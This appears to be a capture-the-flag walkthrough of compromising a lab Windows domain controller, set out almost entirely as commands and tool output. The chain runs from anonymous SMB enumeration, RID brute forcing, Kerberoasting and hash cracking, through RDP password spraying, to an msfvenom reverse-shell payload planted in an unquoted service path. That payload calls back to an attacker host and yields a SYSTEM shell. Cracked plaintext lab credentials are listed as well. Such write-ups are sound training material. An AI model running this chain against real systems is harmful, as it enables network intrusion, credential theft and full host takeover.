## INFORMATION GATHERING
```bash
# IP ADDRESS
10.201.50.35
# HOSTNAME                 //Found Post Initial Enumeration
LAB-DC             
# OPERATING SYSTEM         //Found Post Initial Enumeration
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
# CREDENTIALS              //Found Post Initial Enumeration
replication:101RepAdmin123!!
nik:ToastyBoi!
bitbucket:littleredbucket
```
## OPEN PORTS DETAILS
```bash
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?

80/tcp    open  http          Microsoft IIS httpd 10.0
7990/tcp  open  http          Microsoft IIS httpd 10.0

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
636/tcp   open  tcpwrapped

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-21 07:52:20Z)
464/tcp   open  kpasswd5?

135/tcp   open  msrpc         Microsoft Windows RPC
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

3389/tcp  open  ms-wbt-server Microsoft Terminal Services

5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
53/tcp    open  domain        Simple DNS Plus

47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
```
# ENUMERATION
```bash
- Anonymous share listing
sudo nxc smb $ip --shares -u 'anonymous' -p ''
SMB         10.201.50.35    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False) 
SMB         10.201.50.35    445    LAB-DC           [+] LAB.ENTERPRISE.THM\anonymous: (Guest)
SMB         10.201.50.35    445    LAB-DC           [*] Enumerated shares
SMB         10.201.50.35    445    LAB-DC           Share           Permissions     Remark
SMB         10.201.50.35    445    LAB-DC           -----           -----------     ------
SMB         10.201.50.35    445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.201.50.35    445    LAB-DC           C$                              Default share
SMB         10.201.50.35    445    LAB-DC           Docs            READ            
SMB         10.201.50.35    445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.201.50.35    445    LAB-DC           NETLOGON                        Logon server share 
SMB         10.201.50.35    445    LAB-DC           SYSVOL                          Logon server share 
SMB         10.201.50.35    445    LAB-DC           Users           READ            Users Share. Do Not Touch!

- Shares with Read Permission
SMB         10.201.50.35    445    LAB-DC           Share           Permissions     Remark
SMB         10.201.50.35    445    LAB-DC           -----           -----------     ------
SMB         10.201.50.35    445    LAB-DC           Docs            READ            
SMB         10.201.50.35    445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.201.50.35    445    LAB-DC           Users           READ            Users Share. Do Not Touch!

- Docs share
sudo nxc smb $ip -u 'anonymous' -p '' --spider Docs --regex .
SMB         10.201.50.35    445    LAB-DC           //10.201.50.35/Docs/RSA-Secured-Credentials.xlsx [lastm:'2021-03-15 08:17' size:15360]
SMB         10.201.50.35    445    LAB-DC           //10.201.50.35/Docs/RSA-Secured-Document-PII.docx [lastm:'2021-03-15 08:17' size:18432]

- Shares IPC$ and Users doesn't have any interesting files 
- Users share shows usernames
  
 - Downloading files from share Docs
sudo nxc smb $ip -u 'anonymous' -p '' --share Docs --get-file "RSA-Secured-Credentials.xlsx" "./RSA-Secured-Credentials.xlsx"
sudo nxc smb $ip -u 'anonymous' -p '' --share Docs --get-file "RSA-Secured-Document-PII.docx" "./RSA-Secured-Document-PII.docx"

- Seems like the files are password protected
- office2john and tried cracking hash - unable to crack
  
- RID Brute force
sudo nxc smb $ip -u 'anonymous' -p '' --rid-brute | tee raw-rid
SMB                      10.201.50.35    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False) 
SMB                      10.201.50.35    445    LAB-DC           [+] LAB.ENTERPRISE.THM\anonymous: (Guest)
SMB                      10.201.50.35    445    LAB-DC           500: LAB-ENTERPRISE\Administrator (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           501: LAB-ENTERPRISE\Guest (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
SMB                      10.201.50.35    445    LAB-DC           520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
SMB                      10.201.50.35    445    LAB-DC           571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.201.50.35    445    LAB-DC           572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.201.50.35    445    LAB-DC           1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
SMB                      10.201.50.35    445    LAB-DC           1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1107: LAB-ENTERPRISE\nik (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1108: LAB-ENTERPRISE\replication (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1109: LAB-ENTERPRISE\spooks (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1110: LAB-ENTERPRISE\korone (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1111: LAB-ENTERPRISE\banana (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1112: LAB-ENTERPRISE\Cake (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1117: LAB-ENTERPRISE\varg (SidTypeUser)
SMB                      10.201.50.35    445    LAB-DC           1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
SMB                      10.201.50.35    445    LAB-DC           1119: LAB-ENTERPRISE\joiner (SidTypeUser)
 
  
- User validation using kerbrute
sudo ./kerbrute userenum ./usernames --dc $ip -d LAB.ENTERPRISE.THM  
2025/08/22 15:33:41 >  [+] VALID USERNAME:       bitbucket@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       replication@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       ENTERPRISE$@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       spooks@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       nik@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       Administrator@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       LAB-DC$@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       atlbitbucket@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       Guest@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       Cake@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       korone@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       banana@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       joiner@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       varg@LAB.ENTERPRISE.THM
2025/08/22 15:33:41 >  [+] VALID USERNAME:       contractor-temp@LAB.ENTERPRISE.THM

- ASREP ROASTING 
sudo impacket-GetNPUsers LAB.ENTERPRISE.THM/ -usersfile ./users -format john -outputfile asrep-hashes.txt -dc-ip $ip
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User replication doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bitbucket doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User atlbitbucket doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ENTERPRISE$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User spooks doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LAB-DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nik doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User korone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User varg doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User banana doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User contractor-temp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cake doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User joiner doesn't have UF_DONT_REQUIRE_PREAUTH set

- Spidering Share Users
sudo nxc smb $ip -u 'anonymous' -p '' --spider Users --regex . 
- Found File   /LAB-ADMIN/AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/Consolehost_hisory.txt

- Download the file
sudo nxc smb $ip -u 'anonymous' -p '' --share Users --get-file "/LAB-ADMIN/AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/Consolehost_hisory.txt" "./Consolehost_hisory.txt"

- File contents of Consolehost_hisory.txt
echo "replication:101RepAdmin123!!">private.txt  

- Found Possible Credentials
replication:101RepAdmin123!!
  
# Checking the site http://enterprise.thm:7990
Reminder to all Enterprise-THM Employees:
We are moving to Github!

# OSINT
site:github.com "Enterprise-THM"  
- Checking people and found commints on file with creds

https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8  

# Creds
nik:ToastyBoi!

# Share Enum with creds
sudo nxc smb $ip -u ./users -p 'ToastyBoi!' --shares --continue-on-success 2>/dev/null
SMB         10.201.50.35    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False) 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\Guest:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\replication:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\Administrator:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\bitbucket:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\atlbitbucket:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\ENTERPRISE$:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\spooks:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\LAB-DC$:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\korone:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\varg:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\banana:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\contractor-temp:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\Cake:ToastyBoi! STATUS_LOGON_FAILURE 
SMB         10.201.50.35    445    LAB-DC           [-] LAB.ENTERPRISE.THM\joiner:ToastyBoi! STATUS_LOGON_FAILURE 

sudo nxc smb $ip -u nik -p 'ToastyBoi!' --shares 2>/dev/null 
SMB         10.201.50.35    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False) 
SMB         10.201.50.35    445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 
SMB         10.201.50.35    445    LAB-DC           [*] Enumerated shares
SMB         10.201.50.35    445    LAB-DC           Share           Permissions     Remark
SMB         10.201.50.35    445    LAB-DC           -----           -----------     ------
SMB         10.201.50.35    445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.201.50.35    445    LAB-DC           C$                              Default share
SMB         10.201.50.35    445    LAB-DC           Docs            READ            
SMB         10.201.50.35    445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.201.50.35    445    LAB-DC           NETLOGON        READ            Logon server share 
SMB         10.201.50.35    445    LAB-DC           SYSVOL          READ            Logon server share 
SMB         10.201.50.35    445    LAB-DC           Users           READ            Users Share. Do Not Touch!

# Kerbroasting
sudo impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip $ip -request -outputfile kerbhash 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 06:50:01.333272  2021-04-26 20:46:41.570158             

# Cracking hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt kerbhash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littleredbucket  (?)     
1g 0:00:00:00 DONE (2025-08-23 09:10) 2.222g/s 3490Kp/s 3490Kc/s 3490KC/s lizuknueroskta..liss27
Use the "--show" option to display all of the cracked passwords reliably

# Credentials
bitbucket:littleredbucket

# RDP Brute force
sudo patator rdp_login host=$ip user=FILE0 password=FILE1 0=./users 1=./passwords -x ignore:code=134            
/usr/bin/patator:452: SyntaxWarning: invalid escape sequence '\w'
  before_urls=http://10.0.0.1/index before_egrep='_N1_:<input type="hidden" name="nonce1" value="(\w+)"|_N2_:name="nonce2" value="(\w+)"'
/usr/bin/patator:2674: SyntaxWarning: invalid escape sequence '\w'
  ('prompt_re', 'regular expression to match prompts [\w+:]'),
/usr/bin/patator:2687: SyntaxWarning: invalid escape sequence '\w'
  def execute(self, host, port='23', inputs=None, prompt_re='\w+:', timeout='20', persistent='0'):
/usr/bin/patator:3361: SyntaxWarning: invalid escape sequence '\w'
  ('prompt_re', 'regular expression to match prompts [\w+:]'),
/usr/bin/patator:3383: SyntaxWarning: invalid escape sequence '\w'
  def execute(self, host, port='513', luser='root', user='', password=None, prompt_re='\w+:', timeout='10', persistent='0'):
/usr/bin/patator:4254: SyntaxWarning: invalid escape sequence '\d'
  m = re.search(' Authentication only, exit status (\d+)', err)
/usr/bin/patator:4971: SyntaxWarning: invalid escape sequence '\('
  mesg = 'Handshake returned: %s (%s)' % (re.search('SA=\((.+) LifeType', out).group(1), re.search('\t(.+) Mode Handshake returned', out).group(1))
09:31:41 patator    INFO - Starting Patator 1.0 (https://github.com/lanjelot/patator) with python-3.13.6 at 2025-08-23 09:31 IST
09:31:41 patator    INFO -                                                                              
09:31:41 patator    INFO - code  size    time | candidate                          |   num | mesg
09:31:41 patator    INFO - -----------------------------------------------------------------------------
09:31:49 patator    INFO - 0     42     5.150 | bitbucket:littleredbucket          |    12 | exit: 1, err: ERRCONNECT_CONNECT_CANCELLED
09:31:50 patator    INFO - 147   49     4.488 | nik:ToastyBoi!                     |    26 | exit: 0, err: ERRCONNECT_CONNECT_TRANSPORT_FAILED
09:31:55 patator    INFO - Hits/Done/Skip/Fail/Size: 2/45/0/0/45, Avg: 3 r/s, Time: 0h 0m 13s

# RDP credentials - bitbucket:littleredbucket
sudo xfreerdp3 /d:LAB.ENTERPRISE.THM /u:bitbucket /p:littleredbucket /cert:ignore /v:$ip +clipboard /dynamic-resolution
```
## PRIVILEGE ESCALATION
```bash
# Run winpeas.exe
zerotieroneservice(zerotieroneservice)[C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe] - Auto - Stopped - No quotes and Space detected         
File Permissions: Users [Allow: WriteData/CreateFiles]                                                                                                                 
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Zero Tier\Zero Tier One (Users [Allow: WriteData/CreateFiles])

# Privesc
sc qc zerotieroneservice                                                                                                                                                                     
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: zerotieroneservice                                                              
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START                                                   
        ERROR_CONTROL      : 1   NORMAL   
        BINARY_PATH_NAME   : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe                                                                                                 
        LOAD_ORDER_GROUP   :                                                                  
        TAG                : 0
        DISPLAY_NAME       : zerotieroneservice                                                                                                                                              
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

- Service runs as LocalSystem
- Service State stopped  
C:\Windows\Tasks>sc query zerotieroneservice                                                   
sc query zerotieroneservice

SERVICE_NAME: zerotieroneservice 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0

# reverse.exe 
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.80.25 LPORT=53 -f exe -o reverse.exe

- Copy reverse.exe
 
C:\Windows\Tasks>copy "C:\Windows\Tasks\reverse.exe" "C:\Program Files (x86)\Zero Tier\Zero.exe"
copy "C:\Windows\Tasks\reverse.exe" "C:\Program Files (x86)\Zero Tier\Zero.exe"
        1 file(s) copied.

sudo rlwrap nc -nvlp 53

C:\Windows\Tasks>net start zerotieroneservice

sudo rlwrap nc -nvlp 53                    
[sudo] password for kali: 
listening on [any] 53 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.50.35] 50732
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Fri Aug 22 15:00:01 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.50.35
Nmap scan report for LAB.ENTERPRISE.THM (10.201.50.35)
Host is up (0.29s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-22 09:30:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-21T09:29:26
| Not valid after:  2026-02-20T09:29:26
| MD5:   ef20:4bf9:6ce9:0de2:d6b4:dc80:7bb5:5b89
|_SHA-1: fe3c:6b5d:1b69:45e1:b31d:94e0:2d38:76a8:7efe:6ee4
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-22T09:31:47+00:00
|_ssl-date: 2025-08-22T09:31:58+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-22T09:31:47
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 22 15:02:06 2025 -- 1 IP address (1 host up) scanned in 125.50 seconds
```

